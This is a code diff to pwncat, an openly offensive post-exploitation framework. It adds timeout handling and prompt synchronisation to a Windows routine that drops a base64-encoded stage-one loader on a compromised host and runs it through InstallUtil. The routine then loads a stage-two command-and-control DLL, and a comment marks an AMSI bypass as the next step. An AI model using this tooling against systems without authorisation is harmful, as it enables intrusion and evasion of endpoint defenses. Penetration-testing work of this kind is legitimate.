@@ -39,6 +39,7 @@ import requests
 import pwncat
 import pwncat.util
 import pwncat.subprocess
+from pwncat.channel import ChannelTimeout
 from pwncat.platform import Path, Platform, PlatformError
 
 INTERACTIVE_END_MARKER = b"INTERACTIVE_COMPLETE\r\n"
@@ -620,6 +621,33 @@ function prompt {
 }"""
         )
 
+    def _sync_prompt(self, timeout: Optional[float] = None) -> bytes:
+        """Synchronize with the remote shell prompt.
+
+        We prefer detecting the default prompt marker ('>'), but fall back to
+        sending a unique marker to handle shells which do not emit a prompt.
+        """
+
+        if timeout is None:
+            timeout = self.manager.config.get("win_prompt_timeout", 5.0)
+
+        try:
+            return self.channel.recvuntil(b">", timeout=timeout)
+        except ChannelTimeout:
+            marker = f"PWNCAT_{pwncat.util.random_string(8)}"
+            try:
+                self.channel.send(f"echo {marker}\n".encode("utf-8"))
+                data = self.channel.recvuntil(marker.encode("utf-8"), timeout=timeout)
+                try:
+                    self.channel.recvuntil(b"\n", timeout=timeout)
+                except ChannelTimeout:
+                    pass
+                return data
+            except ChannelTimeout as exc:
+                raise PlatformError(
+                    "unable to synchronize with remote shell; ensure an interactive PowerShell or cmd prompt"
+                ) from exc
+
     def _bootstrap_stage_two(self):
         """This routine upgrades a standard powershell or cmd shell to an
         instance of the pwncat stage two C2. It will first locate a valid
@@ -660,7 +688,9 @@ function prompt {
         good_dir = None
         loader_remote_path = None
 
-        self.channel.recvuntil(b">")
+        bootstrap_timeout = self.manager.config.get("win_bootstrap_timeout", 90.0)
+
+        self._sync_prompt(timeout=bootstrap_timeout)
 
         # Find available file by trying to write first chunk
         for possible in possible_dirs:
@@ -669,8 +699,7 @@ function prompt {
             self.channel.send(
                 f"""echo {chunk} >"{str(loader_remote_path)}"\n""".encode("utf-8")
             )
-            self.channel.recvline()
-            result = self.channel.recvuntil(b">")
+            result = self._sync_prompt(timeout=bootstrap_timeout)
             if b"denied" not in result.lower():
                 self.session.log(
                     f"dropping stage one in {repr(str(loader_remote_path))}"
@@ -686,8 +715,7 @@ function prompt {
                     "utf-8"
                 )
             )
-            self.channel.recvline()
-            self.channel.recvuntil(b">")
+            self._sync_prompt(timeout=bootstrap_timeout)
 
         # Decode the base64 to the actual dll
         self.channel.send(
@@ -695,12 +723,10 @@ function prompt {
                 "utf-8"
             )
         )
-        self.channel.recvline()
-        self.channel.recvuntil(b">")
+        self._sync_prompt(timeout=bootstrap_timeout)
 
         self.channel.send(f"""del "{str(loader_remote_path)}"\n""".encode("utf-8"))
-        self.channel.recvline()
-        self.channel.recvuntil(b">")
+        self._sync_prompt(timeout=bootstrap_timeout)
 
         # Search for all instances of InstallUtil within all installed .Net versions
         self.channel.send(
@@ -708,10 +734,9 @@ function prompt {
                 "utf-8"
             )
         )
-        self.channel.recvline()
 
         # Select the newest version
-        result = self.channel.recvuntil(b">").decode("utf-8")
+        result = self._sync_prompt(timeout=bootstrap_timeout).decode("utf-8")
         install_utils = [
             x.rstrip("\r") for x in result.split("\n") if x.rstrip("\r") != ""
         ][-2]
@@ -732,8 +757,8 @@ function prompt {
         )
 
         # Wait for loader to
-        self.channel.recvuntil(b"READY")
-        self.channel.recvuntil(b"\n")
+        self.channel.recvuntil(b"READY", timeout=bootstrap_timeout)
+        self.channel.recvuntil(b"\n", timeout=bootstrap_timeout)
 
         # Load, Compress and Encode stage two
         with Windows.open_plugin(self.manager, "stagetwo.dll") as filp:
@@ -747,11 +772,13 @@ function prompt {
         self.channel.sendline(encoded)
 
         # Wait for stage two to be loaded
-        self.channel.recvuntil(b"READY")
-        self.channel.recvuntil(b"\n")
+        self.channel.recvuntil(b"READY", timeout=bootstrap_timeout)
+        self.channel.recvuntil(b"\n", timeout=bootstrap_timeout)
 
         # Read host-specific GUID
-        self.host_uuid = self.channel.recvline().strip().decode("utf-8")
+        self.host_uuid = (
+            self.channel.recvline(timeout=bootstrap_timeout).strip().decode("utf-8")
+        )
 
         # Bypass AMSI
         try:
